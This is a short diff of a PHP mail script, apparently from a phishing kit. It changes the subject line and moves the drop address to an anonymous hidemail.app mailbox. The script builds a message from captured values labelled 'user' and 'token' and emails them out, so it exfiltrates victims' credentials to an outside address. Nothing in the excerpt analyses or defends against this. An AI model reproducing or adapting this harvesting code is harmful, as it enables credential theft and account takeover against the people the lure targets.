@@ -26,14 +26,14 @@ try {
     $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
     //Recipients
-    $mail->setFrom('user054@premiummail.sen.org.nz', 'ChurchMeeting-BossJay');
-    $mail->addAddress('amberjin.rewefareast@gmail.com');     // Add a recipient
+    $mail->setFrom('user054@premiummail.sen.org.nz', 'ChurchMeeting-FrChurch');
+    $mail->addAddress('BT6hswNzqfWLrJIP@via.hidemail.app');     // Add a recipient
 	
 	$message = 'user:: '.$e.' - '. 'token:: '.$p;
 
     // Content
     $mail->isHTML(true);                                  // Set email format to HTML
-    $mail->Subject = 'ChurchMeeting-BossJay';
+    $mail->Subject = 'ChurchMeeting-FrChurch';
     $mail->Body    = $message;
 
     $mail->send();
